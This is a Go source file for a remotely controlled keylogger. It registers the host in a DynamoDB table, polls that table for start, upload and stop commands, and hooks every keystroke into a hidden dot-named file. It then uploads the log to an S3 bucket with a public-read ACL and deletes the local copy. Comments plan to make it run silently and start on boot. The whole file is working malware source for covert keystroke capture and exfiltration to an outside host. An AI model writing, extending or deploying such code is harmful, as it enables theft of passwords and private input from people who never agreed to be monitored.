package main

import (
	"fmt"
	"os"
	"time"
	"github.com/robotn/gohook"
	"github.com/joho/godotenv"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
	"github.com/aws/aws-sdk-go/service/dynamodb"
)

// TO IMPLEMENT:
// Make it run silently in the bg
// Find a way to implement boot on startup


func main() {

	err := godotenv.Load()
	if err != nil {
		panic(err)
	}

	hostName, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	putHost(hostName)

	var count int = 1

	runTime := time.Now()

	cmdChan := make(chan string)
	go pollCmds(hostName, cmdChan)

	for {
		cmd := <-cmdChan

		fileName := fmt.Sprintf(".%s - %s %s (%d).txt",
		hostName,
		runTime.Format("Jan 02 2006"),
		runTime.Format(time.Kitchen),
		count)

		if cmd == "start" {
			go startKeylog(hostName, fileName, cmdChan)
		}
		if cmd == "upload" {
			go uploadFile(fileName, count)
			count++
			hook.StopEvent()
		}
		if cmd == "stop" {
			hook.StopEvent()
		}
	}
}

func pollCmds(hostName string, cmdChan chan<- string) {
	var lastCmd string

	for {
		time.Sleep(5 * time.Second)
		cmd := getCmd(hostName)
		if cmd != lastCmd { 
			lastCmd = cmd
			cmdChan <- cmd
		}
	}
}

func startKeylog(hostName string, fileName string, cmdChan chan string) {
	evChan := hook.Start()

	var lastTime time.Time

	file, err := os.Create(fileName)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	for ev := range evChan {
		// Calcs diff between time
		now := time.Now()
		var diff time.Duration
		if !lastTime.IsZero() {
			diff = now.Sub(lastTime)
		}
		lastTime = now

		// If diff > 5 print a new line for ease of reading
		if diff.Seconds() > 5 {
			file.WriteString("\n")
		}

		// Print to file any keystroke recorded and their keychar value
		if ev.Kind == hook.KeyDown {
			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
		}
	}
}

func uploadFile(fileName string, count int) error {

	file, err := os.Open(fileName)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	sess := session.Must(session.NewSession(&aws.Config{
		Region: aws.String("ap-southeast-2"),
	}))

	s3client := s3.New(sess)

	_, err = s3client.PutObject(&s3.PutObjectInput{
		Bucket: aws.String("vialathor-keylog"),
		Key:    aws.String(fileName),
		Body:   file,
		ACL:    aws.String("public-read"),
	})

	os.Remove(fileName)

	return err
}

func getCmd(hostName string) string {

	svc := dynamodb.New(session.New())
	input := &dynamodb.GetItemInput{
		TableName: aws.String("Keylog-table"),
		Key: map[string]*dynamodb.AttributeValue{
			"hostName": {
				S: aws.String(hostName),
			},
		},
	}

	result, err := svc.GetItem(input)
	if err != nil {
		panic(err)
	}

	cmd := result.Item["curr_cmd"]

	return *cmd.S

}

func putHost(hostName string) error {

	svc := dynamodb.New(session.New())
	input := &dynamodb.PutItemInput{
		TableName:	aws.String("Keylog-table"),
		Item:		map[string]*dynamodb.AttributeValue{
			"hostName": {
				S: aws.String(hostName),
			},
			"curr_cmd": {
				S: aws.String("idle"),
			},
		},
	}

	_, err := svc.PutItem(input)
	if err != nil {
		panic(err)
	}

	return err
}

// func keylog(string hostName) {

// 	// Start the listening process
// 	evChan := hook.Start()
// 	defer hook.End()

// 	var lastTime time.Time
// 	runTime := time.Now()

// 	// hostName, err := os.Hostname()
// 	// if err != nil {
// 	// 	panic(err)
// 	// }

// 	// need to test if the name actually changes.
// 	fileName := fmt.Sprintf(".%s - %s %s.txt",
// 	hostName,
// 	runTime.Format("Jan 02 2006"),
// 	runTime.Format(time.Kitchen))

// 	file, err := os.Create(fileName)
// 	if err != nil {
// 		panic(err)
// 	}
// 	defer file.Close()

// 	for ev := range evChan {
// 		if ev.Kind == hook.KeyDown {
// 			// 27 == esc - temp
// 			if ev.Keychar == 27 {
// 				err = uploadFile(fileName)
// 				os.Remove(fileName)
// 				if err != nil {
// 					panic(err)
// 				}
// 				break
// 			}

// 			// To change - Idk if i should set this to 1 hr / 6 hrs ?
// 			if time.Since(runTime).Minutes() >= 1 {
// 				err = uploadFile(fileName)
// 				os.Remove(fileName)
// 				if err != nil {
// 					panic(err)
// 				}
// 				file.Close()
// 				fileName := fmt.Sprintf(".%s - %s %s.txt",
// 				hostName,
// 				runTime.Format("Jan 02 2006"),
// 				runTime.Format(time.Kitchen))
// 				file, err = os.Create(fileName)
// 				if err != nil {
// 					panic(err)
// 				}
// 				runTime = time.Now()
// 			}

// 			// Calcs diff between time
// 			now := time.Now()
// 			var diff time.Duration
// 			if !lastTime.IsZero() {
// 				diff = now.Sub(lastTime)
// 			}
// 			lastTime = now

// 			// If diff > 5 print a new line for ease of reading
// 			if diff.Seconds() > 5 {
// 				file.WriteString("\n")
// 			}

// 			// Print to file any keystroke recorded and their keychar value
// 			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))

// 		}
// 	}
// }